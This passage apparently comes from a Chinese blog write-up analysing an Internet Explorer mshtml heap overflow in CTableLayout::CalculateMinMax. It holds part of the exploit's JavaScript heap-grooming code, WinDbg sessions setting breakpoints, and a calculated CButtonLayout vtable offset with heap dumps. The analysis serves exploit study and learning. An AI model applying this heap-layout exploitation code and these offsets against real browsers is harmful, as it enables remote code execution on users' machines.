class="built_in">document</span>.getElementById(<span class="string">"test"</span>);</span><br><span class="line">        div_container.style.cssText = <span class="string">"display:none"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i &lt; <span class="number">500</span>; i+=<span class="number">2</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// E</span></span><br><span class="line">            rra[i] = dap.substring(<span class="number">0</span>, (<span class="number">0x100</span><span class="number">-6</span>)/<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// S, bstr = A</span></span><br><span class="line">            arr[i] = padding.substring(<span class="number">0</span>, (<span class="number">0x100</span><span class="number">-6</span>)/<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// A, bstr = B</span></span><br><span class="line">            arr[i+<span class="number">1</span>] = filler.substring(<span class="number">0</span>, (<span class="number">0x100</span><span class="number">-6</span>)/<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// B</span></span><br><span class="line">            <span class="keyword">var</span> obj = <span class="built_in">document</span>.createElement(<span class="string">"button"</span>);</span><br><span class="line">            div_container.appendChild(obj);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">200</span>; i&lt;<span class="number">500</span>; i+=<span class="number">2</span> ) &#123;</span><br><span class="line">            rra[i] = <span class="literal">null</span>;</span><br><span class="line">            CollectGarbage();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p><p>这部分主要是用来构造堆布局,构造结果如下。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-17-075240.jpg" alt=""><br>然后从中间（200）开始释放EEEE…，腾出空间。<br>释放的位置就是为了在分配vulheap时能够占用到释放位置中的一个，当溢出时就可以占用到后面的字符串和CButtonLayout。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">************* Symbol Path validation summary **************</span><br><span class="line">Response                         Time (ms)     Location</span><br><span class="line">Deferred                                       srv*</span><br><span class="line"></span><br><span class="line">************* Symbol Path validation summary **************</span><br><span class="line">Response                         Time (ms)     Location</span><br><span class="line">Deferred                                       srv*</span><br><span class="line"></span><br><span class="line">Microsoft (R) Windows Debugger Version 6.3.9600.17200 X86</span><br><span class="line">Copyright (c) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">*** wait with pending attach</span><br><span class="line"></span><br><span class="line">************* Symbol Path validation summary **************</span><br><span class="line">Response                         Time (ms)     Location</span><br><span class="line">Deferred                                       srv*</span><br><span class="line"></span><br><span class="line">************* Symbol Path validation summary **************</span><br><span class="line">Response                         Time (ms)     Location</span><br><span class="line">Deferred                                       srv*</span><br><span class="line">Symbol search path is: srv*</span><br><span class="line">Executable search path is: srv*</span><br><span class="line">ModLoad: 013c0000 01466000   C:\Program Files\Internet Explorer\iexplore.exe</span><br><span class="line">(c0.ea8): Break instruction exception - code 80000003 (first chance)</span><br><span class="line">eax=7ff96000 ebx=00000000 ecx=00000000 edx=77a0d23d esi=00000000 edi=00000000</span><br><span class="line">eip=779a3540 esp=07abfe00 ebp=07abfe2c iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">ntdll!DbgBreakPoint:</span><br><span class="line">779a3540 cc              int     3</span><br><span class="line">0:021&gt; .childdbg 1</span><br><span class="line">Processes created by the current process will be debugged</span><br><span class="line">0:021&gt; .symfix</span><br><span class="line">0:021&gt; .reload</span><br><span class="line">Reloading current modules</span><br><span class="line">................................................................</span><br><span class="line">...........</span><br><span class="line">0:021&gt; sxe ld:jscript</span><br><span class="line">0:021&gt; g</span><br><span class="line"></span><br><span class="line">************* Symbol Path validation summary **************</span><br><span class="line">Response                         Time (ms)     Location</span><br><span class="line">Deferred                                       srv*</span><br><span class="line"></span><br><span class="line">************* Symbol Path validation summary **************</span><br><span class="line">Response                         Time (ms)     Location</span><br><span class="line">Deferred                                       srv*</span><br><span class="line">Symbol search path is: srv*</span><br><span class="line">Executable search path is: srv*</span><br><span class="line">(fd4.630): Break instruction exception - code 80000003 (first chance)</span><br><span class="line">eax=00000000 ebx=00000000 ecx=0014f620 edx=779b64f4 esi=fffffffe edi=00000000</span><br><span class="line">eip=77a0e60e esp=0014f63c ebp=0014f668 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">ntdll!LdrpDoDebuggerBreak+0x2c:</span><br><span class="line">77a0e60e cc              int     3</span><br><span class="line">1:014&gt;  lmm jscript</span><br><span class="line">start    end        module name</span><br><span class="line">1:014&gt; g</span><br><span class="line">ModLoad: 6f640000 6f6f2000   C:\Windows\System32\jscript.dll</span><br><span class="line">eax=0345de14 ebx=00000000 ecx=00000007 edx=00000000 esi=7ffda000 edi=0345e22c</span><br><span class="line">eip=779b64f4 esp=0345e144 ebp=0345e198 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">ntdll!KiFastSystemCallRet:</span><br><span class="line">779b64f4 c3              ret</span><br><span class="line">1:023&gt; lmm jscript</span><br><span class="line">start    end        module name</span><br><span class="line">6f640000 6f6f2000   jscript    (deferred)</span><br></pre></td></tr></table></figure></p><p>先通过windbg attach ie，然后打开childdbg，因为刚开始IE还没有加载jsript.dll，所以可以先设置加载jscript.dll时断下（sxe）,按g运行，拖入exp。<br>lmm确定载入后，再对JSCollectGarbage下断（bp),然后g运行。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1:023&gt; bp jscript!JsCollectGarbage</span><br><span class="line">1:023&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=0345f0f0 ebx=0345f0a0 ecx=0136e0a0 edx=6f6c8555 esi=0136ff40 edi=0345f090</span><br><span class="line">eip=6f6c8555 esp=0345f050 ebp=0345f0b4 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">jscript!JsCollectGarbage:</span><br><span class="line">6f6c8555 a180d06d6f      mov     eax,dword ptr [jscript!g_luTls (6f6dd080)] ds:0023:6f6dd080=00000038</span><br></pre></td></tr></table></figure></p><p>继续下断，找到vulheap分配的位置，具体分析参考漏洞战争。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1:023&gt; bl</span><br><span class="line"> 0 e 6f6c8555     0001 (0001)  1:**** jscript!JsCollectGarbage</span><br><span class="line">1:023&gt; bd 0</span><br><span class="line">1:023&gt; bu ntdll!RtlFreeHeap &quot;.echo free heap;db poi(esp+c) l10;g&quot;</span><br><span class="line">1:023&gt; bu mshtml!CTableLayout::CalculateMinMax+0x16d &quot;.echo vulheap;dd poi(ebx+9c) l4;g&quot;</span><br><span class="line">1:023&gt; bu jscript!JsStrSubString</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1:023&gt; .logopen</span><br><span class="line">Opened log file &apos;dbgeng.log</span><br></pre></td></tr></table></figure><p>打开log文件做记录，另外我在jscript!JsStrSubString下了额外的断点。<br>此外改动一下exp，加个alert。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">'javascript'</span>&gt;</span><br><span class="line">alert(<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">var</span> obj_col = <span class="built_in">document</span>.getElementById(<span class="string">"132"</span>);</span><br><span class="line">obj_col.span = <span class="number">19</span>;</span><br></pre></td></tr></table></figure></p><p>断下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.....</span><br><span class="line">.....</span><br><span class="line">.....</span><br><span class="line">.....</span><br><span class="line">free heap</span><br><span class="line">0156d718  ff ff ff ff ff ff ff ff-80 32 0c 04 00 00 00 00  .........2......</span><br><span class="line">free heap</span><br><span class="line">040c3280  80 59 ed 69 00 00 00 00-00 00 00 00 c7 59 e9 00  .Y.i.........Y..</span><br><span class="line">Breakpoint 5 hit</span><br><span class="line">eax=0375f108 ebx=0375efa0 ecx=02f01318 edx=6eb289cb esi=02f05800 edi=0375f2b4</span><br><span class="line">eip=6eb289cb esp=0375ef50 ebp=0375efb4 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">jscript!JsStrSubstring:</span><br><span class="line">6eb289cb 8bff            mov     edi,edi</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1:025&gt; .logclose</span><br><span class="line">Closing open log file dbgeng.log</span><br></pre></td></tr></table></figure><p>保存之后，最后一个vulheap就是我们要找的.<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-17-175951.png" alt=""></p><p>另外为了确定虚表偏移,直接动态找一下吧。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">1:027&gt; x mshtml!CButtonLayout::*</span><br><span class="line">6a04519d          mshtml!CButtonLayout::GetThemeClassId (&lt;no parameter info&gt;)</span><br><span class="line">6a0c0d9d          mshtml!CButtonLayout::GetInsets (&lt;no parameter info&gt;)</span><br><span class="line">69ff3c90          mshtml!CButtonLayout::`vftable&apos; = &lt;no type information&gt;</span><br><span class="line">6a045499          mshtml!CButtonLayout::GetAutoSize (&lt;no parameter info&gt;)</span><br><span class="line">6a2562f6          mshtml!CButtonLayout::HitTestContent (&lt;no parameter info&gt;)</span><br><span class="line">6a02b4b7          mshtml!CButtonLayout::DrawClientBackground (&lt;no parameter info&gt;)</span><br><span class="line">69ff9251          mshtml!CButtonLayout::Init (&lt;no parameter info&gt;)</span><br><span class="line">6a045499          mshtml!CButtonLayout::GetMultiLine (&lt;no parameter info&gt;)</span><br><span class="line">6a1c61d8          mshtml!CButtonLayout::s_layoutdesc = &lt;no type information&gt;</span><br><span class="line">6a2562e6          mshtml!CButtonLayout::GetBtnHelper (&lt;no parameter info&gt;)</span><br><span class="line">6a256121          mshtml!CButtonLayout::GetFocusShape (&lt;no parameter info&gt;)</span><br><span class="line">6a1c61d1          mshtml!CButtonLayout::GetLayoutDesc (&lt;no parameter info&gt;)</span><br><span class="line">6a256281          mshtml!CButtonLayout::DoLayout (&lt;no parameter info&gt;)</span><br><span class="line">6a04519d          mshtml!CButtonLayout::GetWordWrap (&lt;no parameter info&gt;)</span><br><span class="line">69ff3af8          mshtml!CButtonLayout::`vftable&apos; = &lt;no type information&gt;</span><br><span class="line">6a02b4f2          mshtml!CButtonLayout::DrawClient (&lt;no parameter info&gt;)</span><br><span class="line">6a0a32da          mshtml!CButtonLayout::`scalar deleting destructor&apos; (&lt;no parameter info&gt;)</span><br><span class="line">6a255f61          mshtml!CButtonLayout::DrawClientBorder (&lt;no parameter info&gt;)</span><br><span class="line">6a0a32da          mshtml!CButtonLayout::`vector deleting destructor&apos; (&lt;no parameter info&gt;)</span><br><span class="line">6a0c2394          mshtml!CButtonLayout::GetDefaultSize (&lt;no parameter info&gt;)</span><br></pre></td></tr></table></figure></p><p><strong>奇怪的是，有两个虚表，这里我也不知道为什么……</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1:027&gt; lmm mshtml</span><br><span class="line">start    end        module name</span><br><span class="line">69e80000 6a432000   mshtml     (pdb symbols)          C:\WinDbg\x86\sym\mshtml.pdb\5B825981E9B445BBB998A27119FF0D6E2\mshtml.pdb</span><br></pre></td></tr></table></figure></p><p>69ff3af8-69e80000=0x00173af8<br>这和泉哥书上说的中文版win7+ie8环境中的偏移也是一致的。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-17-155223.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-17-155242.png" alt=""><br><strong>然后这我就很不解了……</strong><br><strong>此外看一下vulheap。</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br></pre></td><td class="code"><pre><span class="line">1:026&gt; db 03f2ae30 l101c</span><br><span class="line">03f2ae30  04 10 00 00 04 10 00 00-04 10 00 00 00 00 00 00  ................</span><br><span class="line">03f2ae40  45 00 45 00 41 00 45 00-48 00 01 00 04 10 00 00  E.E.A.E.H.......</span><br><span class="line">03f2ae50  04 10 00 00 04 10 00 00-00 00 00 00 45 00 45 00  ............E.E.</span><br><span class="line">03f2ae60  41 00 45 00 48 00 01 00-04 10 00 00 04 10 00 00  A.E.H...........</span><br><span class="line">03f2ae70  04 10 00 00 00 00 00 00-45 00 45 00 41 00 45 00  ........E.E.A.E.</span><br><span class="line">03f2ae80  48 00 01 00 04 10 00 00-04 10 00 00 04 10 00 00  H...............</span><br><span class="line">03f2ae90  00 00 00 00 45 00 45 00-41 00 45 00 48 00 01 00  ....E.E.A.E.H...</span><br><span class="line">03f2aea0  04 10 00 00 04 10 00 00-04 10 00 00 00 00 00 00  ................</span><br><span class="line">03f2aeb0  45 00 45 00 41 00 45 00-48 00 01 00 04 10 00 00  E.E.A.E.H.......</span><br><span class="line">03f2aec0  04 10 00 00 04 10 00 00-00 00 00 00 45 00 45 00  ............E.E.</span><br><span class="line">03f2aed0  41 00 45 00 48 00 01 00-04 10 00 00 04 10 00 00  A.E.H...........</span><br><span class="line">03f2aee0  04 10 00 00 00 00 00 00-45 00 45 00 41 00 45 00  ........E.E.A.E.</span><br><span class="line">03f2aef0  48 00 01 00 04 10 00 00-04 10 00 00 04 10 00 00  H...............</span><br><span class="line">03f2af00  00 00 00 00 45 00 45 00-41 00 45 00 48 00 01 00  ....E.E.A.E.H...</span><br><span class="line">03f2af10  04 10 00 00 04 10 00 00-04 10 00 00 00 00 00 00  ................</span><br><span class="line">03f2af20  45 00 45 00 41 00 45 00-48 00 01 00 04 10 00 00  E.E.A.E.H.......</span><br><span class="line">03f2af30  04 10 00 00 04 10 00 00-0c 61 81 04 00 00 00 00  .........a......</span><br><span class="line">03f2af40  02 00 00 00 48 00 01 00-04 10 00 00 04 10 00 00  ....H...........</span><br><span class="line">03f2af50  04 10 00 00 41 00 41 00-41 00 41 00 41 00 41 00  ....A.A.A.A.A.A.</span><br><span class="line">03f2af60  48 00 01 00 04 10 00 00-04 10 00 00 04 10 00 00  H...............</span><br><span class="line">03f2af70  41 00 41 00 41 00 41 00-41 00 41 00 48 00 01 00  A.A.A.A.A.A.H...</span><br><span class="line">03f2af80  04 10 00 00 04 10 00 00-04 10 00 00 41 00 41 00  ............A.A.</span><br><span class="line">03f2af90  41 00 41 00 41 00 41 00-48 00 01 00 04 10 00 00  A.A.A.A.H.......</span><br><span class="line">03f2afa0  04 10 00 00 04 10 00 00-41 00 41 00 41 00 41 00  ........A.A.A.A.</span><br><span class="line">03f2afb0  41 00 41 00 48 00 01 00-04 10 00 00 04 10 00 00  A.A.H...........</span><br><span class="line">03f2afc0  04 10 00 00 41 00 41 00-41 00 41 00 41 00 41 00  ....A.A.A.A.A.A.</span><br><span class="line">03f2afd0  48 00 01 00 04 10 00 00-04 10 00 00 04 10 00 00  H...............</span><br><span class="line">03f2afe0  41 00 41 00 41 00 41 00-41 00 41 00 48 00 01 00  A.A.A.A.A.A.H...</span><br><span class="line">03f2aff0  04 10 00 00 04 10 00 00-04 10 00 00 41 00 41 00  ............A.A.</span><br><span class="line">03f2b000  41 00 41 00 41 00 41 00-48 00 01 00 04 10 00 00  A.A.A.A.H.......</span><br><span class="line">03f2b010  04 10 00 00 04 10 00 00-41 00 41 00 41 00 41 00  ........A.A.A.A.</span><br><span class="line">03f2b020  41 00 41 00 48 00 01 00-04 10 00 00 04 10 00 00  A.A.H...........</span><br><span class="line">03f2b030  04 10 00 00 41 00 41 00-41 00 41 00 41 00 41 00  ....A.A.A.A.A.A.</span><br><span class="line">03f2b040  48 00 01 00 41 00 00 00-20 10 d1 01 00 00 00 c2  H...A... .......</span><br><span class="line">03f2b050  0c 61 81 04 00 00 00 00-02 00 00 00 18 00 02 05  .a..............</span><br><span class="line">03f2b060  fa 00 00 00 42 00 42 00-42 00 42 00 42 00 42 00  ....B.B.B.B.B.B.</span><br><span class="line">03f2b070  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b080  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b090  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b0a0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b0b0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b0c0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b0d0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b0e0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b0f0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b100  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b110  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b120  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b130  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b140  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b150  42 00 42 00 42 00 42 00-42 00 42 00 42 00 00 00  B.B.B.B.B.B.B...</span><br><span class="line">03f2b160  05 10 d1 01 00 00 00 c2-c0 6a 81 04 00 00 00 00  .........j......</span><br><span class="line">03f2b170  02 00 00 00 1c 00 02 05-f8 3a 8d 68 10 0b 37 01  .........:.h..7.</span><br><span class="line">03f2b180  70 90 ef 03 90 3c 8d 68-01 00 00 00 00 00 00 00  p....&lt;.h........</span><br><span class="line">03f2b190  09 08 08 01 ff ff ff ff-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b1a0  00 00 00 00 ff ff ff ff-80 00 00 00 ff ff ff ff  ................</span><br><span class="line">03f2b1b0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b1c0  00 00 00 00 24 00 00 00-20 00 00 00 00 00 00 00  ....$... .......</span><br><span class="line">03f2b1d0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b1e0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b1f0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b200  00 00 00 00 00 00 00 00-00 00 00 00 28 b2 f2 03  ............(...</span><br><span class="line">03f2b210  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b220  01 00 00 00 01 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b230  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b240  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................</span><br><span class="line">03f2b250  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b260  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b270  00 00 00 00 00 00 00 00-66 10 d1 01 00 00 00 c2  ........f.......</span><br><span class="line">03f2b280  a4 30 a9 03 00 00 00 00-02 00 00 00 1c 00 02 05  .0..............</span><br><span class="line">03f2b290  04 10 00 00 04 10 00 00-04 10 00 00 00 00 00 00  ................</span><br><span class="line">03f2b2a0  45 00 45 00 41 00 45 00-48 00 01 00 04 10 00 00  E.E.A.E.H.......</span><br><span class="line">03f2b2b0  04 10 00 00 04 10 00 00-00 00 00 00 45 00 45 00  ............E.E.</span><br><span class="line">03f2b2c0  41 00 45 00 48 00 01 00-04 10 00 00 04 10 00 00  A.E.H...........</span><br><span class="line">03f2b2d0  04 10 00 00 00 00 00 00-45 00 45 00 41 00 45 00  ........E.E.A.E.</span><br><span class="line">03f2b2e0  48 00 01 00 04 10 00 00-04 10 00 00 04 10 00 00  H...............</span><br><span class="line">03f2b2f0  00 00 00 00 45 00 45 00-41 00 45 00 48 00 01 00 